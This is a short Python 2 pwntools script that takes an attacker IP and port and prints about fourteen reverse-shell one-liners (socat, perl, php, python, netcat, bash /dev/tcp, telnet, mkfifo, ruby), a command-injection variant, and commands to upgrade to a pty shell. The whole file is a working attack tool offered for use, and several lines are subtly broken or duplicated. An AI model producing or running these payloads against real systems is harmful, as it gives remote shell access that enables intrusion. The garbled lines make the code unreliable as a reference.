#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) != 3:
     sys.stderr.write('[*] Usage: ' + sys.argv[0]+ ' IP PORT\n')
     sys.exit(1)

IP = sys.argv[1]
PORT = sys.argv[2]

a = "socat TCP4:%s:%s EXEC:bash,pty,stderr,setsid,sigint,sane" %(IP,PORT)
b = "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(IP,PORT)
c = "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(IP,PORT)
d = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" %(IP,PORT)
e = "nc -e /bin/sh %s %s" %(IP,PORT)
f = "bash -i >& /dev/tcp/%s/%s 0>&1" %(IP,PORT)
g = "127.0.0.1;bash -i >& /dev/tcp/%s/%s 0>&1" %(IP,PORT)
h = "/bin /telnet %s 80 | /bin/bash | /bin/telnet %s 25" %(IP,IP)
i = "mknod backpipe p && telnet %s %s 0<backpipe | /bin/bash 1>backpipe" %(IP,PORT)
l = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(IP,PORT)
m = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f " %(IP,PORT)
n = "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec slog.infof(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" %(IP,PORT)
o = "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done" %(IP,PORT)
p = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(IP,PORT)

log.success("Reverse Shell:")

for i in (a,b,c,d,e,f,g,h,i,l,m,n,o,p):
   log.info(i)

print ""
log.success("Spawn shell:")
log.info("python -c 'import pty;pty.spawn(\"/bin/bash\")")
log.info("export XTERM=xterm")
